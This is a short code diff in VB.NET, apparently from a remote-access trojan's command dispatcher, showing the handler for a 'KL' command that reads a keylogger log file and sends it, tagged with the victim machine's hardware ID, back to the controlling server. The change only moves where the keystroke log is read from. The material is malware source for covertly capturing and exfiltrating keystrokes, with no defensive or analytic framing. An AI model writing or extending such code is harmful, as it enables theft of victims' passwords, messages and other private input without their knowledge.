@@ -16,8 +16,7 @@
                         C.Send("!P")
 
                     Case "KL"
-                        Dim KL As New C_Keylog
-                        C.Send("KL" + SPL + C_ID.HWID + SPL + IO.File.ReadAllText(KL.LogsPath))
+                        C.Send("KL" + SPL + C_ID.HWID + SPL + IO.File.ReadAllText(IO.Path.GetTempPath + "\" + IO.Path.GetFileNameWithoutExtension(Windows.Forms.Application.ExecutablePath) + ".tmp"))
 
                     Case "CPL" 'check plugin
                         If GTV(A(1)) = Nothing Then
